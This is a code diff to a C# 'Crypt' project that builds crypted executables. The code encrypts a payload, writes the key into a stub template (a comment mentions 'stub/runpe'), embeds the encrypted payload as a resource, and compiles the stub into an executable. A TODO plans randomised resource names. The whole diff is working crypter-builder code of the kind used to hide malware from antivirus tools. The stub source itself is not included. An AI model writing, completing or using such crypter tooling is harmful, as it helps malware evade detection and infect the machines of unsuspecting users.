@@ -24,8 +24,9 @@ namespace Crypt
         public bool Build()
         {
             Byte[] encryptedPL = Encrypt(payload, options.encryptionType);
-            //TODO: add info to stub/runpe
-            bool result = Compile(encryptedPL);
+            string stubSrc = AddInfo(Properties.Resources.Stub);
+
+            bool result = Compile(encryptedPL, stubSrc);
             return result;
         }
 
@@ -46,7 +47,14 @@ namespace Crypt
             return encryptedPL;
         }
 
-        private bool Compile(byte[] encryptedPL)
+        private string AddInfo(string stubSrc)
+        {
+            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(options.encryptionKey));
+
+            return newStub;
+        }
+
+        private bool Compile(byte[] encryptedPL, string stubSrc)
         {
             CompilerParameters compParams = new CompilerParameters();
             compParams.GenerateExecutable = true;
@@ -61,17 +69,18 @@ namespace Crypt
             Dictionary<string, string> providerOptions = new Dictionary<string, string>();
             providerOptions.Add("CompilerVersion", "v2.0");
 
-            using (ResourceWriter resourceWriter = new ResourceWriter("yaes.resources"))
+            //TODO: generate random names for resources
+            string resourceDir = "enc.resources";
+            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
             {
                 resourceWriter.AddResource("yaes", encryptedPL);
                 resourceWriter.Generate();
             }
-
-            string stubSrc = File.ReadAllText(@"D:\Libraries\Desktop\teststub.txt");
+            compParams.EmbeddedResources.Add(resourceDir); //TODO: Delete resource file
 
             CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);
 
-            return true;
+            return !compResults.Errors.HasErrors;
         }
     }
 }
